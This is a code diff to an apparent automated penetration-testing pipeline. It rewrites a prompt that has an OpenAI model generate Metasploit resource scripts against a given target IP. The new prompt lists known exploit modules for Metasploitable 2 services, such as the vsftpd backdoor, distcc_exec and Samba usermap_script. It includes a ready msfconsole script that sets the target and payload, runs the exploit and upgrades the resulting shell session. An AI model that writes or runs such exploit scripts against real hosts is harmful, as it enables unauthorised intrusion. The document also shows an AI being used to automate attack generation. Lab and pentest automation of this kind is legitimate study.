@@ -169,54 +169,55 @@ def node_2b_gpt_pwn_rc_generation(state: Dict) -> Dict:
 
     cve_text = f"CVE: {', '.join(cve_ids)}" if cve_ids else "No specific CVE provided"
 
-    prompt = f"""You are a Metasploit exploitation expert. I need you to generate a complete pwn.rc (Metasploit Resource Script) for the following target:
+    prompt = f"""You are a Metasploit resource script generator. Generate plain msfconsole commands, NOT Ruby code.
 
 TARGET DETAILS:
 - Operating System: {detected_os}
 - Service: {service} {service_version}
-- Target IP (RHOST): {target}
+- Target IP (RHOSTS): {target}
 - Target Port: {port}
 - Attacker IP (LHOST): {lhost}
 - {cve_text}
 
-IMPORTANT: No public Metasploit exploits found in database. Generate a fallback pwn.rc.
+NO public Metasploit exploits found - use this fallback approach.
 
-USE THIS PROVEN WORKING TEMPLATE AS REFERENCE:
-```ruby
-{demo_content}
-```
+EXPLOIT WHITELIST:
+- FTP (vsftpd): exploit/unix/ftp/vsftpd_234_backdoor with payload cmd/shell/bind_tcp
+- SSH: exploit/unix/ssh_version
+- distcc: exploit/unix/misc/distcc_exec with payload cmd/unix/bind_ruby
+- HTTP: exploit/linux/http/apache_mod_cgi_bash_env_exec
+- MySQL: exploit/linux/mysql/udf_priv_esc
+- Samba: exploit/multi/samba/usermap_script
 
-Follow this working structure:
+EXAMPLE OF CORRECT FORMAT (plain Metasploit commands):
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS {target}
+set PAYLOAD cmd/shell/bind_tcp
+set LHOST {lhost}
+set LPORT 4444
+exploit -z
 
-IMPORTANT: Use ONLY these PROVEN WORKING exploits for Metasploitable 2:
-- For FTP (vsftpd 2.3.4): exploit/unix/ftp/vsftpd_234_backdoor with payload cmd/shell/bind_tcp
-- For SSH: exploit/unix/ssh_version
-- For distcc: exploit/unix/misc/distcc_exec with payload cmd/unix/bind_ruby
-- For HTTP (Apache): exploit/linux/http/apache_mod_cgi_bash_env_exec
-- For MySQL: exploit/linux/mysql/udf_priv_esc
+sleep 3
 
-DO NOT search or guess - use the correct one for {service}!
+sessions -u 1
+sleep 30
 
-Steps:
-1. Set RHOST and LHOST variables
-2. Define helper functions (log_info, wait_for_new_session, get_random_available_port)
-3. Use the CORRECT exploit and payload from the list above for {service}
-4. Set RHOSTS (not RHOST), LHOST, LPORT with proper values
-5. Wait for sessions after running exploit
-6. Handle session upgrades and privilege escalation
+sessions
 
-Use framework.sessions and run_single() properly.
+GENERATE YOUR SCRIPT - Plain Metasploit commands ONLY:
+- Use 'use' command with correct exploit for {service}
+- Use 'set' commands for RHOSTS, PAYLOAD, LHOST, LPORT
+- Use 'exploit -z' to run
+- Use 'sleep' to wait
+- Use 'sessions' and 'sessions -u' for upgrading
 
-CRITICAL: Generate ONLY the pwn.rc Ruby code.
-- No explanations, no markdown, no code blocks.
-- Start with: #!/usr/bin/env ruby
-- MUST wrap all Ruby code between <ruby> and </ruby> tags
-- Follow proper structure with helper functions
-- Include wait_for_new_session() logic like in a real working exploit
-- Use framework.sessions to check for sessions
-- Set RHOSTS (not RHOST) for the target
-
-Generate the pwn.rc now:"""
+CRITICAL:
+- Generate ONLY plain Metasploit resource script commands
+- NO Ruby code, NO helper functions, NO definitions
+- Each command on a new line
+- Use correct exploit from whitelist
+- Use RHOSTS (not RHOST)
+- Set PAYLOAD and other options"""
 
     try:
         client = OpenAI(api_key=openai_api_key)
@@ -231,7 +232,7 @@ Generate the pwn.rc now:"""
             messages=[
                 {
                     "role": "system",
-                    "content": "You are an expert Metasploit framework specialist. Generate only complete, working Ruby pwn.rc scripts. No explanations."
+                    "content": "You are an expert Metasploit framework specialist. Generate ONLY plain Metasploit resource script commands (use, set, exploit, sessions, sleep). NO Ruby code, NO helper functions, NO definitions. Each command on new line."
                 },
                 {"role": "user", "content": prompt}
             ],
